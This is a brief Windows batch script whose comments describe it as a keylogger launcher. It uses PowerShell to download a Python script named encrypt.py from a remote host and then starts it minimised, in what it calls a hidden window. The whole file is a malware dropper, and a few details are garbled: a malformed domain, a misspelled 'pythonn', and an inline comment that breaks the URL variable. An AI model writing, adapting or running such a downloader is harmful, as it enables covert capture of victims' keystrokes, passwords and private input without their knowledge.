@echo off
REM Download the Python keylogger script
set "script_url=http://tclancy.mygamesonline.orgr/encrypt"  REM Replace with your actual URL
set "script_name=encrypt.py"
powershell -command "Invoke-WebRequest -Uri %script_url% -OutFile %script_name%"

REM Run the keylogger script in a hidden window
start /min C:\Python\pythonn %script_name%
